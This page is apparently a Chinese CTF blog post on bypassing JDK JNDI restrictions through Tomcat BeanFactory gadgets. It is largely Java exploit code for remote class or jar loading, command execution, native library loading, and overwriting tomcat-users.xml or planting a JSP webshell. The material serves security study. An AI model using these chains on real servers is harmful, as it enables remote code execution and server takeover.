@@ -1,0 +1,305 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MoonlitSyntax | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="初探   ref为空 需要 obj 既不是 Reference 也不是 Referenceable  无法实例化远程对象,没用  令 ref.getFactoryClassLocation() 返回空,这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址,如果对应factory是本地代码,则该值为空  对于方法二,只需要在远程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoonlitSyntax">
+<meta property="og:url" content="https://blog.siren.blue/2024/04/30/ctf/java/JNDI/%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="初探   ref为空 需要 obj 既不是 Reference 也不是 Referenceable  无法实例化远程对象,没用  令 ref.getFactoryClassLocation() 返回空,这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址,如果对应factory是本地代码,则该值为空  对于方法二,只需要在远程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.siren.blue/img/7.jpg">
+<meta property="article:published_time" content="2024-04-30T14:27:58.542Z">
+<meta property="article:modified_time" content="2024-06-08T03:29:59.497Z">
+<meta property="article:author" content="dionysus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.siren.blue/img/7.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.siren.blue/2024/04/30/ctf/java/JNDI/%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MoonlitSyntax',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-08 11:29:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/7.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-30T14:27:58.542Z" title="发表于 2024-04-30 22:27:58">2024-04-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-08T03:29:59.497Z" title="更新于 2024-06-08 11:29:59">2024-06-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="初探">初探</h2>
+<p><img src="/z-img/Pasted%20image%2020240430222802.png" alt="Pasted%20image%2020240430222802"></p>
+<ol>
+<li>ref为空<br>
+需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code></li>
+</ol>
+<p>无法实例化远程对象,没用</p>
+<ol start="2">
+<li>令 <code>ref.getFactoryClassLocation()</code> 返回空,这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址,如果对应factory是本地代码,则该值为空</li>
+</ol>
+<p>对于方法二,只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p>
+<p><code>javax.naming.spi.NamingManager</code><br>
+解析过程中<br>
+如果本地拿到了工厂类,就不需要远程加载,直接本地实例化工厂,再用工厂实例化类返回</p>
+<p><img src="/z-img/Pasted%20image%2020240430223650.png" alt="Pasted%20image%2020240430223650"></p>
+<p>于是找到Tomcat里的BeanFactory</p>
+<p>他使用<code>newInstance</code>创建实例<br>
+只能调用无参构造<br>
+找到的是<code>ELProcessor</code>和<code>GroovyShell</code></p>
+<h3 id="基于BeanFactory"><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">基于BeanFactory</a></h3>
+<h3 id="javax-management-loading-MLet"><code>javax.management.loading.MLet</code></h3>
+<p>jdk自带<br>
+<img src="/z-img/Pasted%20image%2020240502164953.png" alt="Pasted%20image%2020240502164953"></p>
+<p>MLet 继承自 URLClassloader，有一个无参构造方法，还有一个 <code>addURL(String)</code>方法，它的父类还有一个 <code>loadClass(String)</code>方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcatMLet() &#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;javax.management.loading.MLet&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadClass,b=addURL,c=loadClass&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;, &quot;javax.el.ELProcessor&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;b&quot;, &quot;http://127.0.0.1:2333/&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;c&quot;, &quot;Blue&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>能用来进行gadget探测</p>
+<h3 id="GroovyClassLoader"><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/#toc_groovyclassloader">GroovyClassLoader</a></h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcatGroovyClassLoader() &#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=addClasspath,b=loadClass&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;, &quot;http://127.0.0.1:8888/&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;b&quot;, &quot;blue&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GroovyClassLoader.addClasspath(&quot;http://127.0.0.1:8888/&quot;)</span><br><span class="line"></span><br><span class="line">GroovyClassLoader.loadClass(&quot;blue&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="SnakeYaml">SnakeYaml</h3>
+<p>要放个jar包额</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcat_snakeyaml()&#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;org.yaml.snakeyaml.Yaml&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    String yaml = &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">            &quot;  !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">            &quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot; +</span><br><span class="line">            &quot;  ]]\n&quot; +</span><br><span class="line">            &quot;]&quot;;</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=load&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;, yaml));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="XStream">XStream</h3>
+<p><code>new com.thoughtworks.xstream.XStream().fromXML(String)</code>同样符合条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcat_xstream()&#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;com.thoughtworks.xstream.XStream&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    String xml = &quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot; +</span><br><span class="line">            &quot;  &lt;unserializable-parents/&gt;\n&quot; +</span><br><span class="line">            &quot;  &lt;java.util.PriorityQueue&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;default&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;size&gt;2&lt;/size&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;/default&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;int&gt;3&lt;/int&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;dynamic-proxy&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot; +</span><br><span class="line">            &quot;        &lt;active&gt;true&lt;/active&gt;\n&quot; +</span><br><span class="line">            &quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot; +</span><br><span class="line">            &quot;        &lt;probes&gt;\n&quot; +</span><br><span class="line">            &quot;          &lt;entry&gt;\n&quot; +</span><br><span class="line">            &quot;            &lt;method&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;parameter-types&gt;\n&quot; +</span><br><span class="line">            &quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;/parameter-types&gt;\n&quot; +</span><br><span class="line">            &quot;            &lt;/method&gt;\n&quot; +</span><br><span class="line">            &quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;implementing__method&gt;\n&quot; +</span><br><span class="line">            &quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot; +</span><br><span class="line">            &quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot; +</span><br><span class="line">            &quot;                &lt;parameter-types&gt;\n&quot; +</span><br><span class="line">            &quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot; +</span><br><span class="line">            &quot;                &lt;/parameter-types&gt;\n&quot; +</span><br><span class="line">            &quot;              &lt;/implementing__method&gt;\n&quot; +</span><br><span class="line">            &quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +</span><br><span class="line">            &quot;          &lt;/entry&gt;\n&quot; +</span><br><span class="line">            &quot;        &lt;/probes&gt;\n&quot; +</span><br><span class="line">            &quot;      &lt;/handler&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;/dynamic-proxy&gt;\n&quot; +</span><br><span class="line">            &quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot; +</span><br><span class="line">            &quot;  &lt;/java.util.PriorityQueue&gt;\n&quot; +</span><br><span class="line">            &quot;&lt;/java.util.PriorityQueue&gt;&quot;;</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=fromXML&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;, xml));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我这里会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; javax.naming.NamingException: Forced String setter fromXML threw exception for property a</span><br><span class="line">	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:216)</span><br><span class="line">	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:332)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:142)</span><br><span class="line">	at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">	at zip.JNDI.JNDI_RMI.main(JNDI_RMI.java:19)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>怀疑是setter方法的时候出了问题</p>
+<h3 id="MVEL">MVEL</h3>
+<p>从<code>org.mvel2.sh.ShellSession#exec(String)</code>进入会按照内置的几个命令进行处理</p>
+<p><img src="/z-img/Pasted%20image%2020240502183326.png" alt="Pasted%20image%2020240502183326"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcat_MVEL()&#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;org.mvel2.sh.ShellSession&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=exec&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;,</span><br><span class="line">            &quot;push Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;);&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="NativeLibLoader">NativeLibLoader</h3>
+<p><code>com.sun.glass.utils.NativeLibLoader</code>是JDK的类，它有一个<code>loadLibrary(String)</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcat_loadLibrary()&#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;com.sun.glass.utils.NativeLibLoader&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadLibrary&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;a&quot;, &quot;/../../../../../../../../../../../../tmp/libcmd&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上传动态链接库,然后再利用</p>
+<p>调试发现,路径是拼接的,在macos下会自己加上<code>dylib</code>,所以<code>../</code>和文件名自己改一下,然后就OK了.在Linux上应该是加载so文件,Windows应该是dll文件</p>
+<h2 id="XXE-RCE">XXE &amp; RCE</h2>
+<p>第二个类<br>
+<code>org.apache.catalina.users.MemoryUserDatabaseFactory</code></p>
+<p>这里会先实例化一个<code>MemoryUserDatabase</code>对象然后从 Reference 中取出 pathname、readonly 这两个最主要的参数并调用 setter 方法赋值。<br>
+<img src="/z-img/Pasted%20image%2020240502210014.png" alt="Pasted%20image%2020240502210014"><br>
+赋值完成会先调用<code>open()</code>方法，如果readonly=false那就会调用<code>save()</code>方法。</p>
+<h3 id="rce">rce</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digester.addFactoryCreate(&quot;tomcat-users/group&quot;, new MemoryGroupCreationFactory(this), true);</span><br><span class="line">digester.addFactoryCreate(&quot;tomcat-users/role&quot;, new MemoryRoleCreationFactory(this), true);</span><br><span class="line">digester.addFactoryCreate(&quot;tomcat-users/user&quot;, new MemoryUserCreationFactory(this), true);</span><br></pre></td></tr></table></figure>
+<p>这里分别根据xml解析结果给 <code>MemoryUserDatabase#groups,MemoryUserDatabase#users,MemoryUserDatabase#roles</code>填充数据。</p>
+<p>首先从<code>org.apache.catalina.users.MemoryUserCreationFactory#createObject</code>中取出了 username，password 元素。</p>
+<p>然后调用<code>org.apache.catalina.users.MemoryUserDatabase#createUser</code>这时 MemoryUser 对象被添加到了 users 对象里，这样 users 就不是空的了。这里不能为空的原因是后面写文件内容时是从，users、groups、roles里取的。</p>
+<p>进入 <code>save()</code>方法的主逻辑代码需要先经过 <code>isWriteable()==true</code> 的判断<br>
+这里出现了第一个问题，由于需要控制文件写入内容，所以必须要让 pathname 是一个远程URL，如果是远程URL的话这里把<code>catalina.base+pathname</code> 组成文件名去实例化了一个 File 对象，所以这个目录必然<strong>不存在、不是目录、不可写</strong>，也就无法通过判断。</p>
+<p>那如果用目录跳转呢？假如 <code>CATALINA.BASE=/usr/apache-tomcat-8.5.73/</code>,<code>pathname=http://127.0.0.1:8888/../../conf/tomcat-users.xml</code></p>
+<p>他们组成的文件路径就是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code></p>
+<p>getParentFile 获取到的是 <code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/</code></p>
+<p>在 Windows 下这样没问题，但如果是Linux系统的话，目录跳转符号前面的目录是必须存在的。</p>
+<p>所以要解决Linux系统下的问题，必须要让 <code>CATALINA.BASE</code>文件夹下有<code>/http:/127.0.0.1:8888/</code> 这个目录的存在，这就需要用到<code>BeanFactory</code>来执行一个<strong>可以创建目录</strong>的利用类<br>
+他随便找了一个<code>org.h2.store.fs.FileUtils#createDirectory(String)</code>，创建目录的gadget花点时间应该能找到很多更通用的</p>
+<p><img src="/z-img/Pasted%20image%2020240502220202.png" alt="Pasted%20image%2020240502220202"></p>
+<p>因为要在 CATALINA.BASE创建目录，所以需要从工作目录<code>CATALINA.BASE/bin</code> 向上跳一级，分别执行 <code>tomcatMkdirFrist</code> 和 <code>tomcatMkdirLast</code> ，这样 <code>CATALINA.BASE</code>目录下就会创建出一个<code> http:</code>目录和它的子目录<code>127.0.0.1:8888</code>。</p>
+<p>Linux环境下 isWriteable() 的校验也就通过了</p>
+<p>前面这部分会先把事先在 <code>open()</code> 方法就解析好的 <code>users、groups、roles</code>都写入到 pathnameNew 这个文件里。</p>
+<p>如果pathname是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code></p>
+<p>那pathnameNew就是<code>/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml.new</code></p>
+<p>最后会把 pathnameNew 这个文件移动到 pathname。</p>
+<p>写文件的原理摸清楚了就可以开始准备RCE，RCE的方法有两种，分别是覆盖 tomcat-users.xml 和写 webshell 。</p>
+<h3 id="创建Tomcat管理员">创建Tomcat管理员</h3>
+<p><img src="/z-img/Pasted%20image%2020240502220509.png" alt="Pasted%20image%2020240502220509"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static ResourceRef tomcatManagerAdd() &#123;</span><br><span class="line">    ResourceRef ref = new ResourceRef(&quot;org.apache.catalina.UserDatabase&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">            true, &quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;, null);</span><br><span class="line">    ref.add(new StringRefAddr(&quot;pathname&quot;, &quot;http://127.0.0.1:8888/../../conf/tomcat-users.xml&quot;));</span><br><span class="line">    ref.add(new StringRefAddr(&quot;readonly&quot;, &quot;false&quot;));</span><br><span class="line">    return ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后只需要让JNDI返回这个ResourceRef对象，它就会先去访问 <code>http://127.0.0.1:8888/../../conf/tomcat-users.xml</code>然后把它覆盖到 <code>CATALINA.BASE/http:/127.0.0.1:8888/../../conf/tomcat-users.xml</code>经过目录跳转后是<code>CATALINA.BASE/conf/tomcat-users.xml</code></p>
+<p>文件覆盖成功后，就可以用新账号密码去登录 Tomcat 后台了</p>
+<h3 id="webshell">webshell</h3>
+<p>首先启动一个8888端口，让访问<code>http://127.0.0.1:8888/webapps/ROOT/test.jsp</code>能返回这样一段XML。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;<span class="symbol">&amp;#x3c;</span>%Runtime.getRuntime().exec(<span class="symbol">&amp;#x22;</span>/System/Applications/Calculator.app/Contents/MacOS/Calculator<span class="symbol">&amp;#x22;</span>); %<span class="symbol">&amp;#x3e;</span>&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure>
